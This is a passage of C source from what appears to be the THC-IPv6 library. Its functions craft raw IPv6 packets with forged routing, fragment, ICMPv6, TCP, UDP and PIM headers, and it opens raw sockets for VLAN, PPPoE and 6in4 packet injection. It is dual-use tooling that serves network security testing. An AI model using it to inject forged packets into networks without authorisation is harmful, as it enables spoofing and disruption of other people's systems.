  return thc_create_ipv6_extended(
      interface, dst != NULL && *dst == 0xff ? PREFER_LINK : PREFER_GLOBAL,
      pkt_len, src, dst, 255, 0, 0, 0, 0);
}

// XXX TODO FIXME
int thc_add_ipv4_extended(unsigned char *pkt, int *pkt_len, int src, int dst,
                          unsigned char tos, int id, unsigned char ttl) {
  thc_ipv6_hdr *    hdr = (thc_ipv6_hdr *)pkt;
  thc_ipv6_ext_hdr *ehdr = (thc_ipv6_ext_hdr *)hdr->final,
                   *nehdr = malloc(sizeof(thc_ipv6_ext_hdr));
  unsigned char *buf2 = malloc(20), type = NXT_IP4;

  if (nehdr == NULL || hdr == NULL || buf2 == NULL) {
    if (buf2 != NULL) free(buf2);
    if (nehdr != NULL) free(nehdr);
    return -1;
  }

  if (ehdr == NULL) {
    hdr->next = type;
    hdr->next_segment = (char *)nehdr;
  } else {
    ehdr->next = type;
    ehdr->next_segment = (char *)nehdr;
  }
  hdr->final = (char *)nehdr;
  hdr->final_type = type;

  memset(buf2, 0, 20);

  buf2[0] = 0x45;
  buf2[3] = 20;  // needs to be updated at final!
  buf2[4] = getpid() % 256;
  buf2[5] = getpid() / 256;
  buf2[8] = 0xff;
  buf2[9] = NXT_NONXT;  // needs to be updated at final!
  memcpy(buf2 + 12, (char *)&src + _TAKE4, 4);
  memcpy(buf2 + 16, (char *)&dst + _TAKE4, 4);
  /* // needs to be updated at final!
     checksum = checksum_pseudo_header(NULL, NULL, NXT_IP4, buf2, 20);
     buf2[10] = checksum / 256;
     buf2[11] = checksum % 256;
   */

  nehdr->next_segment = NULL;
  nehdr->next = NXT_NONXT;
  nehdr->data = buf2;
  nehdr->data_len = 20;
  nehdr->length = 20;
  hdr->length += 20;
  *pkt_len += 20;

  return 0;
}

int thc_add_ipv4(unsigned char *pkt, int *pkt_len, int src, int dst) {
  return thc_add_ipv4_extended(pkt, pkt_len, src, dst, 0, 0, 64);
}

int thc_add_ipv4_rudimentary(unsigned char *pkt, int *pkt_len, int src4,
                             int dst4, int sport, int port) {
#define THC_IPv4_RUDIMENTARY_LEN (20 + 16)
  thc_ipv6_hdr *hdr = (thc_ipv6_hdr *)pkt;
  char *        ihdr =
      malloc(THC_IPv4_RUDIMENTARY_LEN);  // ipv4 hdr + udp/icmp + 8 data
  thc_ipv6_ext_hdr *ehdr;
  int               checksum;

  if (ihdr == NULL) return -1;
  memset(ihdr, 0, THC_IPv4_RUDIMENTARY_LEN);

  if (hdr->final != NULL) {
    ehdr = (thc_ipv6_ext_hdr *)hdr->final;
    ehdr->next_segment = (char *)ihdr;
    ehdr->next = NXT_IP4_RUDIMENTARY;
  } else {
    hdr->next_segment = (char *)ihdr;
    hdr->next = NXT_IP4_RUDIMENTARY;
  }
  hdr->final = (char *)ihdr;
  hdr->final_type = NXT_IP4_RUDIMENTARY;

  // set ihdr buffer
  memset(ihdr + 28, 'A', 8);
  ihdr[0] = 0x45;
  ihdr[3] = THC_IPv4_RUDIMENTARY_LEN;
  ihdr[4] = getpid() % 256;
  ihdr[5] = getpid() / 256;
  ihdr[6] = 64;  // dont fragment bit
  ihdr[8] = 63;  // TTL
  if (port == -1) {
    ihdr[9] = NXT_ICMP4;
    ihdr[20] = 8;     // ICMPv4 Echo Request
    ihdr[22] = 0x00;  // checksum
    ihdr[23] = 0x00;  // checksum
    ihdr[24] = sport / 256;
    ihdr[25] = sport % 256;
    ihdr[26] = 3;
    ihdr[27] = 4;
    checksum = checksum_pseudo_header(NULL, NULL, NXT_ICMP4, ihdr + 20,
                                      THC_IPv4_RUDIMENTARY_LEN - 20);
    ihdr[22] = (((unsigned)checksum / 256) % 256);
    ihdr[23] = (unsigned)checksum % 256;
  } else {
    ihdr[9] = NXT_UDP;
    ihdr[20] = sport / 256;  // srcport
    ihdr[21] = sport % 256;  // srcport
    ihdr[22] = (port / 256) % 256;
    ihdr[23] = port % 256;
    ihdr[25] = 8;  // udp pkt length
    // no checksum
  }
  memcpy(ihdr + 12, (char *)&src4 + _TAKE4, 4);
  memcpy(ihdr + 16, (char *)&dst4 + _TAKE4, 4);

  checksum = checksum_pseudo_header(NULL, NULL, NXT_IP4, ihdr, 20);
  ihdr[10] = (((unsigned)checksum / 256) % 256);
  ihdr[11] = (unsigned)checksum % 256;

  hdr->length += THC_IPv4_RUDIMENTARY_LEN;
  *pkt_len += THC_IPv4_RUDIMENTARY_LEN;

  return 0;
}

int thc_add_hdr_misc(unsigned char *pkt, int *pkt_len, unsigned char type,
                     int len, unsigned char *buf, int buflen) {
  thc_ipv6_hdr *    hdr = (thc_ipv6_hdr *)pkt;
  thc_ipv6_ext_hdr *ehdr = (thc_ipv6_ext_hdr *)hdr->final,
                   *nehdr = malloc(sizeof(thc_ipv6_ext_hdr));
  unsigned char *buf2 =
      malloc((buflen % 8 == 6 ? buflen : (((buflen + 1) / 8) * 8) + 6));

  if (nehdr == NULL || hdr == NULL || buf == NULL || buf2 == NULL) {
    if (buf2 != NULL) free(buf2);
    if (nehdr != NULL) free(nehdr);
    return -1;
  }

  if (ehdr == NULL) {
    hdr->next = type;
    hdr->next_segment = (char *)nehdr;
  } else {
    ehdr->next = type;
    ehdr->next_segment = (char *)nehdr;
  }
  hdr->final = (char *)nehdr;
  hdr->final_type = type;

  memset(buf2, 0, (buflen % 8 == 6 ? buflen : (((buflen + 1) / 8) * 8) + 6));
  memcpy(buf2, buf, buflen);

  nehdr->next_segment = NULL;
  nehdr->next = NXT_NONXT;
  nehdr->data = buf2;
  nehdr->data_len = (buflen % 8 == 6 ? buflen : (((buflen + 1) / 8) * 8) + 6);
  if (len == -1)
    nehdr->length = (nehdr->data_len + 1) / 8;
  else
    nehdr->length = len % 256;
  hdr->length +=
      (buflen % 8 == 6 ? buflen + 2 : (((buflen + 1) / 8) * 8) + 6 + 2);
  *pkt_len += (buflen % 8 == 6 ? buflen + 2 : (((buflen + 1) / 8) * 8) + 6 + 2);

  return 0;
}

int thc_add_hdr_route(unsigned char *pkt, int *pkt_len, unsigned char **routers,
                      unsigned char routerptr) {
  thc_ipv6_hdr *    hdr = (thc_ipv6_hdr *)pkt;
  thc_ipv6_ext_hdr *ehdr = (thc_ipv6_ext_hdr *)hdr->final,
                   *nehdr = malloc(sizeof(thc_ipv6_ext_hdr));
  int            i = 0, j;
  unsigned char *buf;

  if (nehdr == NULL || hdr == NULL) {
    free(nehdr);
    return -1;
  }

  if (ehdr == NULL) {
    hdr->next = NXT_ROUTE;
    hdr->next_segment = (char *)nehdr;
  } else {
    ehdr->next = NXT_ROUTE;
    ehdr->next_segment = (char *)nehdr;
  }
  hdr->final = (char *)nehdr;
  hdr->final_type = NXT_ROUTE;

  while (routers[i] != NULL)
    i++;
  if (i > 23)
    if (_thc_ipv6_showerrors)
      fprintf(stderr,
              "Warning: IPv6 Routing Header is adding more than 23 targets, "
              "packet might be dropped by destination\n");
  if (i == 0)
    if (_thc_ipv6_showerrors)
      fprintf(stderr,
              "Warning: IPv6 Routing Header added without routing targets\n");
  if ((buf = malloc(i * 16 + 2 + 4)) == NULL) {
    free(nehdr);
    return -1;
  }

  memset(buf, 0, i * 16 + 2 + 4);
  buf[1] = routerptr;
  // byte 0 = type; byte 2 reserved; bytes 3-5: loose source routing
  for (j = 0; j < i; j++)
    memcpy(buf + 6 + j * 16, routers[j], 16);

  nehdr->next_segment = NULL;
  nehdr->next = NXT_NONXT;
  nehdr->data = buf;
  nehdr->data_len = i * 16 + 2 + 4;
  nehdr->length = i * 2;
  hdr->length += nehdr->data_len + 2;
  *pkt_len += nehdr->data_len + 2;

  if (i > 0 && routerptr > 0) hdr->final_dst = nehdr->data + 6 + (i - 1) * 16;

  return 0;
}

int thc_add_hdr_mobileroute(unsigned char *pkt, int *pkt_len,
                            unsigned char *dst) {
  thc_ipv6_hdr *    hdr = (thc_ipv6_hdr *)pkt;
  thc_ipv6_ext_hdr *ehdr = (thc_ipv6_ext_hdr *)hdr->final,
                   *nehdr = malloc(sizeof(thc_ipv6_ext_hdr));
  unsigned char *buf;

  if (nehdr == NULL || hdr == NULL) {
    free(nehdr);
    return -1;
  }

  if (ehdr == NULL) {
    hdr->next = NXT_ROUTE;
    hdr->next_segment = (char *)nehdr;
  } else {
    ehdr->next = NXT_ROUTE;
    ehdr->next_segment = (char *)nehdr;
  }
  hdr->final = (char *)nehdr;
  hdr->final_type = NXT_ROUTE;

  if ((buf = malloc(16 + 2 + 4)) == NULL) {
    free(nehdr);
    return -1;
  }
  memset(buf, 0, 16 + 2 + 4);
  // byte 0 = type; 1 = routers to do; byte 2 reserved; bytes 3-5: loose source
  // routing
  buf[0] = 2;
  buf[1] = 1;
  memcpy(buf + 6, dst, 16);

  nehdr->next_segment = NULL;
  nehdr->next = NXT_NONXT;
  nehdr->data = buf;
  nehdr->data_len = 16 + 2 + 4;
  nehdr->length = 2;
  hdr->length += nehdr->data_len + 2;
  *pkt_len += nehdr->data_len + 2;

  hdr->final_dst = nehdr->data + 6;

  return 0;
}

int thc_add_hdr_oneshotfragment(unsigned char *pkt, int *pkt_len,
                                unsigned int id) {
  unsigned char buf[6];
  int           pid;

  memset(buf, 0, sizeof(buf));
  if (id == 0) {
    pid = getpid();
    memcpy(buf + 2, (char *)&pid + _TAKE4, 4);
    buf[4] = 0xb0;  // IDS support
    buf[5] = 0x0b;
  } else
    memcpy(buf + 2, (char *)&id + _TAKE4, 4);
  return thc_add_hdr_misc(pkt, pkt_len, NXT_FRAG, -1, buf, sizeof(buf));
}

int thc_add_hdr_fragment(unsigned char *pkt, int *pkt_len, int offset,
                         char more_frags, unsigned int id) {
  thc_ipv6_hdr *    hdr = (thc_ipv6_hdr *)pkt;
  thc_ipv6_ext_hdr *ehdr = (thc_ipv6_ext_hdr *)hdr->final,
                   *nehdr = malloc(sizeof(thc_ipv6_ext_hdr));
  unsigned char *buf = malloc(6);
  int            coffset = (offset > 8191 ? 8191 : offset) << 3;

  if (offset > 8191) {
    if (_thc_ipv6_showerrors)
      fprintf(
          stderr,
          "Error: fragment offset can not be larger than 8191 (2^13 - 1)\n");
    free(nehdr);
    free(buf);
    return -1;
  }

  if (nehdr == NULL || hdr == NULL || buf == NULL) {
    free(nehdr);
    free(buf);
    return -1;
  }

  if (ehdr == NULL) {
    hdr->next = NXT_FRAG;
    hdr->next_segment = (char *)nehdr;
  } else {
    ehdr->next = NXT_FRAG;
    ehdr->next_segment = (char *)nehdr;
  }
  hdr->final = (char *)nehdr;
  hdr->final_type = NXT_FRAG;

  if (more_frags) coffset++;
  memset(buf, 0, 6);
  buf[0] = coffset / 256;
  buf[1] = coffset % 256;
  buf[2] = id / 16777216;
  buf[3] = (id % 16777216) / 65536;
  buf[4] = (id % 65536) / 256;
  buf[5] = id % 256;

  nehdr->next_segment = NULL;
  nehdr->next = NXT_NONXT;
  nehdr->data = buf;
  nehdr->data_len = 6;
  nehdr->length = (nehdr->data_len + 1) / 8;
  hdr->length += nehdr->data_len + 2;
  *pkt_len += nehdr->data_len + 2;

  return 0;
}

int thc_add_hdr_dst(unsigned char *pkt, int *pkt_len, unsigned char *buf,
                    int buflen) {
  return thc_add_hdr_misc(pkt, pkt_len, NXT_OPTS, -1, buf, buflen);
}

int thc_add_hdr_hopbyhop(unsigned char *pkt, int *pkt_len, unsigned char *buf,
                         int buflen) {
  return thc_add_hdr_misc(pkt, pkt_len, NXT_HDR, -1, buf, buflen);
}

int thc_add_hdr_nonxt(unsigned char *pkt, int *pkt_len, int hdropt) {
  thc_ipv6_hdr *hdr = (thc_ipv6_hdr *)pkt;

  if (hdr->final_type == NXT_NONXT) {
    // nothing to be done, its the default
  } else {
    switch (hdr->final_type) {
      case NXT_IP6:
      case NXT_HDR:
      case NXT_ROUTE:
      case NXT_FRAG:
      case NXT_OPTS:
      case NXT_ESP:
      case NXT_AH:
        // nothing to be done as its the default
        break;
      default:
        if (_thc_ipv6_showerrors)
          fprintf(stderr,
                  "Warning: Not possible to attach a no-next-header attribute "
                  "if the last header is a icmp/tcp/udp/data segment\n");
    }
  }

  return 0;
}

int thc_add_icmp6(unsigned char *pkt, int *pkt_len, int type, int code,
                  unsigned int flags, unsigned char *data, int data_len,
                  int checksum) {
  thc_ipv6_hdr *    hdr = (thc_ipv6_hdr *)pkt;
  thc_icmp6_hdr *   ihdr = malloc(sizeof(thc_icmp6_hdr));
  thc_ipv6_ext_hdr *ehdr;

  if (ihdr == NULL) return -1;
  memset(ihdr, 0, sizeof(thc_icmp6_hdr));

  if (hdr->final != NULL) {
    ehdr = (thc_ipv6_ext_hdr *)hdr->final;
    ehdr->next_segment = (char *)ihdr;
    ehdr->next = NXT_ICMP6;
  } else {
    hdr->next_segment = (char *)ihdr;
    hdr->next = NXT_ICMP6;
  }
  hdr->final = (char *)ihdr;
  hdr->final_type = NXT_ICMP6;

  ihdr->type = type;
  ihdr->code = code;
  ihdr->flags = flags;

  if (checksum == 0) {
    ihdr->checksum = DO_CHECKSUM;
  } else
    ihdr->checksum = checksum;

  if (data_len > 0 && data != NULL) {
    if ((ihdr->data = malloc(data_len)) == NULL) return -1;
    ihdr->data_len = data_len;
    memcpy(ihdr->data, data, data_len);
  } else {
    ihdr->data = NULL;
    ihdr->data_len = 0;
  }

  hdr->length += data_len + 8;
  *pkt_len += data_len + 8;

  return 0;
}

int thc_add_tcp(unsigned char *pkt, int *pkt_len, unsigned short int sport,
                unsigned short int dport, unsigned int sequence,
                unsigned int ack, unsigned char flags,
                unsigned short int window, unsigned short int urgent,
                char *option, int option_len, char *data, int data_len) {
  thc_ipv6_hdr *    hdr = (thc_ipv6_hdr *)pkt;
  thc_tcp_hdr *     ihdr = malloc(sizeof(thc_tcp_hdr));
  thc_ipv6_ext_hdr *ehdr;
  int               i = option_len;

  if (ihdr == NULL) return -1;
  memset(ihdr, 0, sizeof(thc_tcp_hdr));

  if (hdr->final != NULL) {
    ehdr = (thc_ipv6_ext_hdr *)hdr->final;
    ehdr->next_segment = (char *)ihdr;
    ehdr->next = NXT_TCP;
  } else {
    hdr->next_segment = (char *)ihdr;
    hdr->next = NXT_TCP;
  }
  hdr->final = (char *)ihdr;
  hdr->final_type = NXT_TCP;

  ihdr->sport = sport;
  ihdr->dport = dport;
  ihdr->sequence = sequence;
  ihdr->ack = ack;
  ihdr->flags = flags;
  ihdr->window = window;
  ihdr->urgent = urgent;

  //  if (checksum == 0) {
  ihdr->checksum = DO_CHECKSUM;
  //  } else
  //    ihdr->checksum = checksum;

  if (data_len > 0 && data != NULL) {
    ihdr->data = malloc(data_len);
    ihdr->data_len = data_len;
    memcpy(ihdr->data, data, data_len);
  } else {
    ihdr->data = NULL;
    ihdr->data_len = 0;
  }

  if (option_len > 0 && option != NULL) {
    if ((i = option_len) % 4 > 0) option_len = (((option_len / 4) + 1) * 4);
    ihdr->option = malloc(option_len);
    ihdr->option_len = option_len;
    memcpy(ihdr->option, option, i);
  } else {
    ihdr->option = NULL;
    ihdr->option_len = 0;
  }

  i = (20 + option_len) / 4;
  ihdr->length = ((i % 16) * 16) + (i / 16);

  hdr->length += data_len + 20 + option_len;
  *pkt_len += data_len + 20 + option_len;

  return 0;
}

int thc_add_udp(unsigned char *pkt, int *pkt_len, unsigned short int sport,
                unsigned short int dport, unsigned int checksum, char *data,
                int data_len) {
  thc_ipv6_hdr *    hdr = (thc_ipv6_hdr *)pkt;
  thc_udp_hdr *     ihdr = malloc(sizeof(thc_udp_hdr));
  thc_ipv6_ext_hdr *ehdr;

  if (ihdr == NULL) return -1;
  memset(ihdr, 0, sizeof(thc_udp_hdr));

  if (hdr->final != NULL) {
    ehdr = (thc_ipv6_ext_hdr *)hdr->final;
    ehdr->next_segment = (char *)ihdr;
    ehdr->next = NXT_UDP;
  } else {
    hdr->next_segment = (char *)ihdr;
    hdr->next = NXT_UDP;
  }
  hdr->final = (char *)ihdr;
  hdr->final_type = NXT_UDP;

  ihdr->sport = sport;
  ihdr->dport = dport;

  if (checksum == 0) {
    ihdr->checksum = DO_CHECKSUM;
  } else
    ihdr->checksum = checksum;

  if (data_len > 0 && data != NULL) {
    ihdr->data = malloc(data_len);
    ihdr->data_len = data_len;
    memcpy(ihdr->data, data, data_len);
  } else {
    ihdr->data = NULL;
    ihdr->data_len = 0;
  }

  ihdr->length = data_len + 8;
  hdr->length += data_len + 8;
  *pkt_len += data_len + 8;

  return 0;
}

int thc_add_pim(unsigned char *pkt, int *pkt_len, unsigned char type,
                unsigned char *data, int data_len) {
  thc_ipv6_hdr *    hdr = (thc_ipv6_hdr *)pkt;
  thc_ipv6_ext_hdr *ehdr = (thc_ipv6_ext_hdr *)hdr->final,
                   *nehdr = malloc(sizeof(thc_ipv6_ext_hdr));
  unsigned char *buf = malloc(data_len + 4);

  if (nehdr == NULL || hdr == NULL || buf == NULL) {
    free(nehdr);
    free(buf);
    return -1;
  }

  if (ehdr == NULL) {
    hdr->next = NXT_PIM;
    hdr->next_segment = (char *)nehdr;
  } else {
    ehdr->next = NXT_PIM;
    ehdr->next_segment = (char *)nehdr;
  }
  hdr->final = (char *)nehdr;
  hdr->final_type = NXT_PIM;

  buf[0] = type % 16;
  buf[0] += 32;  // ensure we set a PIM version (here: v2)
  buf[1] = 0;
  // byte 1: reserved, 2+3: checksum
  memcpy(buf + 4, data, data_len);

  nehdr->next_segment = NULL;
  nehdr->next = type;
  nehdr->data = buf;
  nehdr->data_len = data_len + 4;
  hdr->length += data_len + 4;
  *pkt_len += data_len + 4;

  return 0;
}

int thc_add_data6(unsigned char *pkt, int *pkt_len, unsigned char type,
                  unsigned char *data, int data_len) {
  thc_ipv6_hdr *    hdr = (thc_ipv6_hdr *)pkt;
  thc_ipv6_ext_hdr *ehdr = (thc_ipv6_ext_hdr *)hdr->final,
                   *nehdr = malloc(sizeof(thc_ipv6_ext_hdr));
  unsigned char *buf = malloc(data_len);

  if (nehdr == NULL || hdr == NULL || buf == NULL) {
    free(nehdr);
    free(buf);
    return -1;
  }

  if (ehdr == NULL) {
    hdr->next = NXT_DATA;
    hdr->next_segment = (char *)nehdr;
  } else {
    ehdr->next = NXT_DATA;
    ehdr->next_segment = (char *)nehdr;
  }
  hdr->final = (char *)nehdr;
  hdr->final_type = NXT_DATA;

  memcpy(buf, data, data_len);

  nehdr->next_segment = NULL;
  nehdr->next = type;
  nehdr->data = buf;
  nehdr->data_len = data_len;
  hdr->length += data_len;
  *pkt_len += data_len;

  return 0;
}

int thc_open_ipv6(char *interface) {
  char *             ptr, *ptr2, tbuf[6], vbuf[4];
  int                i = 0;
  int                ret;
  struct sockaddr_in servaddr;

  struct sockaddr_ll sock_ll = {
    sll_family : AF_PACKET,
    sll_protocol : ETH_P_IPV6,
    sll_halen : ETH_ALEN,
  };

  struct ifreq ifr;

  memset(&ifr, 0, sizeof(ifr));

  memset(&sock_ll, 0, sizeof(sock_ll));
  sock_ll.sll_family = AF_PACKET;
  sock_ll.sll_protocol = ETH_P_IPV6;
  sock_ll.sll_halen = ETH_ALEN;

  if (thc_socket >= 0) return thc_socket;

  if (getenv("THC_IPV6_RAW") != NULL || getenv("THC_IPV6_RAWMODE") != NULL)
    thc_ipv6_rawmode(1);

  if ((ptr = getenv("THC_IPV6_VLAN")) != NULL && strlen(ptr) > 0) {
    ptr = strdup(ptr);
    ptr2 = ptr;
    i = 0;
    while ((ptr2 = index(ptr2, ',')) != NULL) {
      i++;
      ptr2++;
    }
    if (i != 2) {
      fprintf(stderr,
              "Error: wrong Syntax in THC_IPV6_VLAN variable: "
              "source_mac,dst_mac,vlan_id - e.g. "
              "01:02:03:04:05:06,07:08:09:a0:a1:a2,7\n");
      exit(-1);
    }
    ptr2 = strtok(ptr, ",");
    ptr2 = strtok(NULL, ",");
    ptr2 = strtok(NULL, ",");
    i = atoi(ptr2);
    if (strlen(ptr) < 1 || i < 0 || i > 4097 || (i == 0 && ptr[0] != '0')) {
      fprintf(stderr,
              "Error: wrong Syntax in THC_IPV6_VLAN variable: "
              "srcmac,dstmac,vlan-id - e.g. "
              "01:02:03:04:05:06,1a:1b:1c:1d:1e:1f,7\n");
      exit(-1);
    }
    vbuf[0] = 0x81;
    vbuf[1] = 0x00;
    vbuf[2] = i / 256;
    vbuf[3] = i % 256;
    do_hdr_vlan = 1;
    do_hdr_off = 4;
    free(ptr);
    printf("Information: VLAN injection/sniffing activated\n");
  }

  if ((ptr = getenv("THC_IPV6_PPPOE")) != NULL && strlen(ptr) > 0) {
    i = 0;
    do_pppoe = 1;
    do_hdr_size = _PPPOE_HDR_SIZE + do_hdr_off;
    if ((do_hdr = malloc(64)) == NULL || (do_capture = malloc(64)) == NULL) {
      fprintf(stderr, "Error: could not allocate necessary memory\n");
      exit(-1);
    }
    ptr2 = ptr;

    while ((ptr2 = index(ptr2, ',')) != NULL) {
      i++;
      ptr2++;
    }
    if (i != 2) {
      fprintf(stderr,
              "Error: wrong Syntax in THC_IPV6_PPPOE variable: "
              "source_mac,dst_mac,ppoe_session_id - e.g. "
              "01:02:03:04:05:06,07:08:09:a0:a1:a2,a1b2\n");
      exit(-1);
    }
    ptr2 = strtok(ptr, ",");
    sscanf(ptr2, "%x:%x:%x:%x:%x:%x", (unsigned int *)&do_hdr[6],
           (unsigned int *)&do_hdr[7], (unsigned int *)&do_hdr[8],
           (unsigned int *)&do_hdr[9], (unsigned int *)&do_hdr[10],
           (unsigned int *)&do_hdr[11]);
    memcpy(tbuf, do_hdr + 6, 6);
    ptr2 = strtok(NULL, ",");
    sscanf(ptr2, "%x:%x:%x:%x:%x:%x", (unsigned int *)&do_hdr[0],
           (unsigned int *)&do_hdr[1], (unsigned int *)&do_hdr[2],
           (unsigned int *)&do_hdr[3], (unsigned int *)&do_hdr[4],
           (unsigned int *)&do_hdr[5]);
    memcpy(do_hdr + 6, tbuf, 6);
    if (do_hdr_vlan)
      sprintf(do_capture, /*"ether proto 0x8100 and */ "ether src %18s", ptr2);
    else
      sprintf(do_capture, /*"ether proto 0x8864 and */ "ether src %18s", ptr2);
    if (do_hdr_vlan) memcpy(do_hdr + 12, vbuf, 4);
    do_hdr[12 + do_hdr_off] = 0x88;
    do_hdr[13 + do_hdr_off] = 0x64;
    // PPPoE Header
    do_hdr[14 + do_hdr_off] = 0x11;
    do_hdr[15 + do_hdr_off] = 0;
    ptr2 = strtok(NULL, ",");
    if (strlen(ptr2) != 4) {
      fprintf(stderr,
              "Error: PPPoE session ID must be hexadecimal and a length of "
              "four, e.g. 0a1f\n");
      exit(-1);
    }
    tbuf[0] = ptr2[0];
    tbuf[1] = ptr2[1];
    tbuf[2] = 0;
    sscanf(tbuf, "%x", (unsigned int *)&do_hdr[16 + do_hdr_off]);
    tbuf[0] = ptr2[2];
    tbuf[1] = ptr2[3];
    sscanf(tbuf, "%x", (unsigned int *)&do_hdr[17 + do_hdr_off]);
    // 2 bytes length: 18+19
    do_hdr[20 + do_hdr_off] = 0x00;
    do_hdr[21 + do_hdr_off] = 0x57;
    if (debug) thc_dump_data(do_hdr, do_hdr_size + do_hdr_off, "PPPoE Header");
    //    if (/*verbose &&*/ _thc_ipv6_showerrors)
    printf("Information: PPPoE injection/sniffing activated\n");
  } else if ((ptr = getenv("THC_IPV6_6IN4")) != NULL && strlen(ptr) > 0) {
    do_6in4 = 1;
    do_hdr_size = _6IN4_HDR_SIZE + do_hdr_off;
    if ((do_hdr = malloc(64)) == NULL || (do_capture = malloc(64)) == NULL) {
      fprintf(stderr, "Error: could not allocate necessary memory\n");
      exit(-1);
    }

    ptr2 = ptr;
    while ((ptr2 = index(ptr2, ',')) != NULL) {
      i++;
      ptr2++;
    }
    if (i != 3) {
      fprintf(stderr,
              "Error: wrong Syntax in THC_IPV6_6IN4 variable: "
              "source_mac,dst_mac,src_ip,dst_ip - e.g. "
              "01:02:03:04:05:06,07:08:09:a0:a1:a2,1.1.1.1,2.2.2.2\n");
      exit(-1);
    }
    ptr2 = strtok(ptr, ",");
    sscanf(ptr2, "%x:%x:%x:%x:%x:%x", (unsigned int *)&do_hdr[6],
           (unsigned int *)&do_hdr[7], (unsigned int *)&do_hdr[8],
           (unsigned int *)&do_hdr[9], (unsigned int *)&do_hdr[10],
           (unsigned int *)&do_hdr[11]);
    memcpy(tbuf, do_hdr + 6, 6);
    ptr2 = strtok(NULL, ",");
    sscanf(ptr2, "%x:%x:%x:%x:%x:%x", (unsigned int *)&do_hdr[0],
           (unsigned int *)&do_hdr[1], (unsigned int *)&do_hdr[2],
           (unsigned int *)&do_hdr[3], (unsigned int *)&do_hdr[4],
           (unsigned int *)&do_hdr[5]);
    memcpy(do_hdr + 6, tbuf, 6);
    if (do_hdr_vlan) memcpy(do_hdr + 12, vbuf, 4);

    do_hdr[12 + do_hdr_off] = 8;
    do_hdr[13 + do_hdr_off] = 0;
    // IPv4 Hdr
    do_hdr[14 + do_hdr_off] = 0x45;
    do_hdr[15 + do_hdr_off] = 0;
    // 2 bytes length: 16+17
    do_hdr[18 + do_hdr_off] = 0;
    do_hdr[19 + do_hdr_off] = 0;
    do_hdr[20 + do_hdr_off] = 0;
    do_hdr[21 + do_hdr_off] = 0;
    do_hdr[22 + do_hdr_off] = 64;
    do_hdr[23 + do_hdr_off] = 41;  // proto ipv6
    do_hdr[24 + do_hdr_off] = 0;
    do_hdr[25 + do_hdr_off] = 0;
    // hdr chksum: 24+25
    ptr2 = strtok(NULL, ",");
    if (inet_pton(AF_INET, ptr2, &servaddr.sin_addr) != 1) {
      fprintf(stderr, "Error: 6in4: not a valid IPv4 address: %s\n", ptr2);
      exit(-1);
    }
    memcpy(do_hdr + 26 + do_hdr_off, &servaddr.sin_addr, 4);
    ptr2 = strtok(NULL, ",");
    if (inet_pton(AF_INET, ptr2, &servaddr.sin_addr) != 1) {
      fprintf(stderr, "Error: 6in4: not a valid IPv4 address: %s\n", ptr2);
      exit(-1);
    }
    memcpy(do_hdr + 30 + do_hdr_off, &servaddr.sin_addr, 4);
    if (do_hdr_vlan)
      sprintf(do_capture, /*"ether proto 0x8100 and */ "ether src %18s", ptr2);
    else
      sprintf(do_capture, "ip proto 41 and src %16s", ptr2);
    if (debug) thc_dump_data(do_hdr, do_hdr_size, "6in4 Header");
    //    if (/*verbose &&*/ _thc_ipv6_showerrors)
    printf("Information: 6in4 injection/sniffin activated\n");
  }
  if (do_hdr_vlan == 1 && do_6in4 == 0 && do_pppoe == 0) {
    do_hdr_size = 14 + do_hdr_off;
    if ((do_hdr = malloc(64)) == NULL || (do_capture = malloc(64)) == NULL) {
      fprintf(stderr, "Error: could not allocate necessary memory\n");
      exit(-1);
    }
    ptr = getenv("THC_IPV6_VLAN");
    ptr2 = strtok(ptr, ",");
    sscanf(ptr2, "%x:%x:%x:%x:%x:%x", (unsigned int *)&do_hdr[6],
           (unsigned int *)&do_hdr[7], (unsigned int *)&do_hdr[8],
           (unsigned int *)&do_hdr[9], (unsigned int *)&do_hdr[10],
           (unsigned int *)&do_hdr[11]);
    memcpy(tbuf, do_hdr + 6, 6);
    ptr2 = strtok(NULL, ",");
    sscanf(ptr2, "%x:%x:%x:%x:%x:%x", (unsigned int *)&do_hdr[0],
           (unsigned int *)&do_hdr[1], (unsigned int *)&do_hdr[2],
           (unsigned int *)&do_hdr[3], (unsigned int *)&do_hdr[4],
           (unsigned int *)&do_hdr[5]);
    memcpy(do_hdr + 6, tbuf, 6);
    memcpy(do_hdr + 12, vbuf, 4);
    do_hdr[16] = 0x86;
    do_hdr[17] = 0xdd;
    sprintf(do_capture, /*"ether proto 0x8100 and */ "ether src %18s", ptr2);
  }

  int s = -1;

  if (_thc_ipv6_rawmode)
    s = socket(
        PF_PACKET, SOCK_DGRAM,
        htons(ETH_P_ALL));  // XXX BUG TODO FIXME : no this is not working.
  else
    s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  // return socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP));

  // Bind socket to interface
  if (interface) {
    strncpy((char *)ifr.ifr_name, interface, IFNAMSIZ);
    ret = ioctl(s, SIOCGIFINDEX, &ifr, sizeof(ifr));
    if (ret < 0) { perror("IOCTL SIOCGIFINDEX Failed"); }
    if (debug) printf("Socket interface idx %d\n", ifr.ifr_ifindex);

    sock_ll.sll_ifindex = ifr.ifr_ifindex;
    ioctl(s, SIOCGIFHWADDR, &ifr, sizeof(ifr));
    if (ret < 0) { perror("IOCTL SIOCGIFHWADDR, Failed"); }
    if (debug)
      printf("Socket interface HW addr: %s\n",
             ether_ntoa((struct ether_addr *)ifr.ifr_hwaddr.sa_data));

    memcpy(sock_ll.sll_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    ret = bind(s, (const struct sockaddr *)&sock_ll, sizeof(sock_ll));
    if (ret < 0) { perror("Bind failed"); }
  }

  return s;
}

int thc_generate_pkt(char *interface, unsigned char *srcmac,
                     unsigned char *dstmac, unsigned char *pkt, int *pkt_len) {
  thc_ipv6_hdr *    hdr = (thc_ipv6_hdr *)pkt;
  thc_ipv6_ext_hdr *ehdr;
  thc_icmp6_hdr *   ihdr;
  thc_tcp_hdr *     thdr;
  thc_udp_hdr *     uhdr;
  char *next, *mysrcmac = NULL, *mydstmac = NULL, *last_type, *checksum_src;
  int   type, bufptr, do_checksum = 0, offset = 0, i, is_ip4 = 0, malloc_size;

  malloc_size = *pkt_len + 14 + do_hdr_size + 64;
  if (malloc_size < 2048) malloc_size = 2048;

  if (pkt == NULL || hdr->pkt != NULL ||
      (hdr->pkt = malloc(malloc_size)) == NULL)
    return -1;

  hdr->pkt_len = *pkt_len;

  if (interface == NULL) interface = default_interface;

  if (thc_socket < 0) thc_socket = thc_open_ipv6(interface);

  if (_thc_ipv6_rawmode == 0) {
    if (do_pppoe || do_6in4 || do_hdr_vlan) {
      if (do_pppoe) {
